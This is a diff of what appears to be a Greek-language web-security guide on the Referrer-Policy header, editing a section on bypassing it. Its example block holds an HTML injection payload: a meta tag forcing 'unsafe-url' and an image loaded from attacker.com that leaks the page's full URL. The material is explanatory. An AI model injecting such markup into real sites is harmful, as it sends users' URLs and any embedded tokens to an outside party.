@@ -21,10 +21,10 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Αντεπίθεση
+## Counter-Mitigation
 
-Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας μια ετικέτα HTML meta (ο επιτιθέμενος πρέπει να εκμεταλλευτεί και μια ένεση HTML):
-```markup
+Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας μια ετικέτα HTML meta (ο επιτιθέμενος χρειάζεται να εκμεταλλευτεί και μια ένεση HTML):
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
